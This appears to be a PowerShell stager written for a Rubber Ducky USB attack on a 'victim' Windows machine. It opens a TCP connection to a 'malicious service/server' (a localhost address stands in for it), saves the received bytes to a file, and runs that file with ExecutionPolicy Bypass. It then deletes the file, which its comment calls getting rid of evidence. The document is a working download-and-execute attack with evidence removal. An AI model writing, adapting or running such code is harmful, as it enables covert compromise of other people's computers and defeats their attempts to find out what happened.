<# 
    Writing this in powershell, since we're going to try having a Rubber Ducky pick up this script and run it
    We can't guarentee the victim will have any programming languages installed outside of what's in default Windows OS.

    The logic is the same as what we have in the EXE client: connect to malicious service/server, download exe file, and run it.
    
    Documentation - https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient?view=net-8.0 
#>

$IP_ADDR = "127.0.0.1";
$PORT = "8081";

# Create TCP object and connect to port.
$TCP_CLIENT = New-Object System.Net.Sockets.TcpClient;
$TCP_CLIENT.Connect($IP_ADDR, $PORT);

# Grab stream and turn it into a readStream (in both ways)
$STREAM = $TCP_CLIENT.GetStream();
$READ_STREAM = New-Object System.IO.StreamReader($STREAM);

# Chuck all the read data into a PS1 file.
$READ_STREAM.ReadToEnd() >> "./ls_read.exe";

# Execution Policy isn't a security feature - so we can just bypass that
powershell.exe -ExecutionPolicy Bypass -File "./ls_read.exe";

# Get rid of evidence
rm "./ls_read.exe";